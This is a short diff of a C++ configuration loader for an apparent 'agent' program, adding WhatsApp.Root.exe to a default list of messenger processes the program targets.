@@ -96,7 +96,7 @@ bool LoadConfig(AgentConfig& config) {
     if (config.telegramSilenceCycles < 1) config.telegramSilenceCycles = 1;
     if (config.telegramSilenceCycles > 100) config.telegramSilenceCycles = 100;
 
-    std::wstring processesStr = GetIniString(L"Processes", L"TargetProcesses", L"WhatsApp.exe,Telegram.exe,Viber.exe", iniPath);
+    std::wstring processesStr = GetIniString(L"Processes", L"TargetProcesses", L"WhatsApp.exe,WhatsApp.Root.exe,Telegram.exe,Viber.exe", iniPath);
     auto parsed = SplitString(processesStr, L',');
     if (!parsed.empty()) config.targetProcesses = parsed;
 
